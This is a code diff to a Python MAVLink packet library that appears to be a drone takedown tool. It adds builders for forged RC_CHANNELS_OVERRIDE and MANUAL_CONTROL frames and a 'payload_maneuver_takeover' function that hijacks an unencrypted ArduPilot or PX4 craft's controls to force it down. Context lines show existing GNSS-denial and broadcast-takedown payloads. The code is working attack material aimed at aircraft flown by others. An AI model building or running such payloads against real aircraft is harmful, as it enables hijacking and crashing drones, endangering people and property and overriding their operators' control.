@@ -38,6 +38,8 @@ CRC_EXTRA: Dict[int, int] = {
     30: 39,    # ATTITUDE
     33: 104,   # GLOBAL_POSITION_INT
     39: 254,   # MISSION_ITEM
+    69: 243,   # MANUAL_CONTROL
+    70: 124,   # RC_CHANNELS_OVERRIDE
     73: 38,    # MISSION_ITEM_INT
     76: 152,   # COMMAND_LONG
     77: 143,   # COMMAND_ACK
@@ -253,6 +255,155 @@ def payload_gnss_denial(target_sys: int, target_comp: int = 1, seq: int = 0) -> 
     payload = build_command_long_payload(target_sys, target_comp, MAV_CMD["SET_MESSAGE_INTERVAL"],
                                           param1=24.0, param2=-1.0)
     return build_packet_v2(76, payload, sequence=seq)
+
+
+# =====================================================================
+# Sustained-control primitives: RC_CHANNELS_OVERRIDE (70) / MANUAL_CONTROL (69)
+# =====================================================================
+# HONESTY / SCOPE (project rule DOC_CORRECTIONS_MEMO 3H — do not overstate):
+#
+#   These primitives inject operator-chosen stick/RC values into a target
+#   autopilot's control path. They are ONLY effective against a craft that
+#   already accepts unauthenticated/legacy MAVLink-over-RF on a link we can
+#   write to — i.e. a pre-paired or unencrypted SiK-radio ArduPilot/PX4 craft,
+#   the SAME attack surface the existing COMMAND_LONG takedowns exploit.
+#
+#   They DO NOT work against an FHSS / encrypted control link (ELRS/CRSF,
+#   DJI OcuSync, Spektrum DSMX, frequency-hopping/hop-paired or crypto-bound
+#   RC). Against such a link this is not a partial effect — it is NO effect:
+#   the frames are ignored. Callers MUST report "takeover not applicable"
+#   for an encrypted/hop-paired target rather than transmit uselessly. This
+#   is a finer-grained neutralization effect on the legacy-MAVLink surface,
+#   NOT a blanket "take over any drone".
+#
+# RC channel convention below follows ArduPilot's default map (chan1=roll,
+# chan2=pitch, chan3=throttle, chan4=yaw). Channel mapping IS airframe
+# specific; the controlled-descent values are a best-effort safe default, not
+# a guarantee for an arbitrary airframe.
+
+RC_CENTER_US = 1500      # neutral roll/pitch/yaw
+RC_DESCENT_THROTTLE_US = 1300  # below mid-throttle: commands a gentle, controlled descent
+RC_OVERRIDE_RELEASE = 0  # 0 => channel NOT overridden (released to the craft's own RC/failsafe)
+
+
+def build_rc_channels_override_payload(
+    target_system: int,
+    target_component: int,
+    chan1: int = RC_OVERRIDE_RELEASE,
+    chan2: int = RC_OVERRIDE_RELEASE,
+    chan3: int = RC_OVERRIDE_RELEASE,
+    chan4: int = RC_OVERRIDE_RELEASE,
+    chan5: int = RC_OVERRIDE_RELEASE,
+    chan6: int = RC_OVERRIDE_RELEASE,
+    chan7: int = RC_OVERRIDE_RELEASE,
+    chan8: int = RC_OVERRIDE_RELEASE,
+) -> bytes:
+    """MAVLink RC_CHANNELS_OVERRIDE payload (msgid=70), base fields only.
+
+    Wire order is MAVLink's size-sorted order: the eight uint16 channel values
+    first, then the two uint8 ids. A channel value of 0 (or UINT16_MAX) means
+    'do not override this channel'.
+    """
+    for c in (chan1, chan2, chan3, chan4, chan5, chan6, chan7, chan8):
+        if not (0 <= c <= 0xFFFF):
+            raise ValueError(f"RC channel value out of range: {c}")
+    return struct.pack(
+        "<HHHHHHHHBB",
+        chan1, chan2, chan3, chan4, chan5, chan6, chan7, chan8,
+        target_system, target_component,
+    )
+
+
+def build_manual_control_payload(
+    target: int,
+    x: int = 0,
+    y: int = 0,
+    z: int = 0,
+    r: int = 0,
+    buttons: int = 0,
+) -> bytes:
+    """MAVLink MANUAL_CONTROL payload (msgid=69), base fields only.
+
+    x/y/z/r are int16 (-1000..1000; z often 0..1000 for throttle). Wire order
+    is size-sorted: the four int16 axes, the uint16 buttons, then the uint8
+    target.
+    """
+    for v in (x, y, z, r):
+        if not (-1000 <= v <= 1000):
+            raise ValueError(f"MANUAL_CONTROL axis out of range (-1000..1000): {v}")
+    return struct.pack("<hhhhHB", x, y, z, r, buttons & 0xFFFF, target)
+
+
+def _payload_from_frame(frame: bytes) -> bytes:
+    """Extract the raw (possibly zero-trimmed for v2) payload from a frame."""
+    if not frame:
+        raise ValueError("empty frame")
+    if frame[0] == MAVLINK_STX_V2:
+        length = frame[1]
+        return frame[10 : 10 + length]
+    if frame[0] == MAVLINK_STX_V1:
+        length = frame[1]
+        return frame[6 : 6 + length]
+    raise ValueError("unknown STX")
+
+
+def decode_rc_channels_override(frame: bytes) -> Dict:
+    """Round-trip decoder for a RC_CHANNELS_OVERRIDE frame (base fields)."""
+    payload = _payload_from_frame(frame).ljust(18, b"\x00")[:18]
+    vals = struct.unpack("<HHHHHHHHBB", payload)
+    return {
+        "chan_raw": list(vals[0:8]),
+        "target_system": vals[8],
+        "target_component": vals[9],
+    }
+
+
+def decode_manual_control(frame: bytes) -> Dict:
+    """Round-trip decoder for a MANUAL_CONTROL frame (base fields)."""
+    payload = _payload_from_frame(frame).ljust(11, b"\x00")[:11]
+    x, y, z, r, buttons, target = struct.unpack("<hhhhHB", payload)
+    return {"x": x, "y": y, "z": z, "r": r, "buttons": buttons, "target": target}
+
+
+def payload_maneuver_takeover(target_sys: int, target_comp: int = 1, seq: int = 0) -> bytes:
+    """One RC_CHANNELS_OVERRIDE frame commanding a CONTROLLED DESCENT.
+
+    Roll/pitch/yaw held neutral (1500us), throttle driven below mid (1300us) to
+    walk a legacy/unencrypted-MAVLink craft down to a safe landing rather than
+    dropping it. Channels 5-8 are left released (0). This is ONE frame; the
+    sustained neutralization effect comes from re-emitting it at the RC update
+    rate for a BOUNDED, hard-capped duration — see field-bridge/mavlink_takeover.py
+    and payload_library.py PL-011. See the module scope note above: NO effect
+    against an FHSS/encrypted control link.
+    """
+    p = build_rc_channels_override_payload(
+        target_sys, target_comp,
+        chan1=RC_CENTER_US, chan2=RC_CENTER_US,
+        chan3=RC_DESCENT_THROTTLE_US, chan4=RC_CENTER_US,
+    )
+    return build_packet_v2(70, p, sequence=seq)
+
+
+def _self_check_sustained_control() -> None:
+    """Round-trip self-verification, mirroring how the other codecs here prove
+    themselves. Runs at import; raises on any packing/CRC regression."""
+    frame = payload_maneuver_takeover(7, 1, seq=3)
+    info = describe_packet(frame)
+    assert info["valid"] and info["message_id"] == 70, info
+    dec = decode_rc_channels_override(frame)
+    assert dec["target_system"] == 7 and dec["target_component"] == 1, dec
+    assert dec["chan_raw"][2] == RC_DESCENT_THROTTLE_US, dec
+    assert dec["chan_raw"][0] == RC_CENTER_US, dec
+    # MANUAL_CONTROL round-trip
+    mc = build_manual_control_payload(3, x=100, y=-200, z=500, r=0, buttons=0)
+    mframe = build_packet_v2(69, mc, sequence=1)
+    minfo = describe_packet(mframe)
+    assert minfo["valid"] and minfo["message_id"] == 69, minfo
+    mdec = decode_manual_control(mframe)
+    assert mdec["target"] == 3 and mdec["z"] == 500 and mdec["y"] == -200, mdec
+
+
+_self_check_sustained_control()
 
 
 def broadcast_takedown(seq: int = 0) -> bytes:
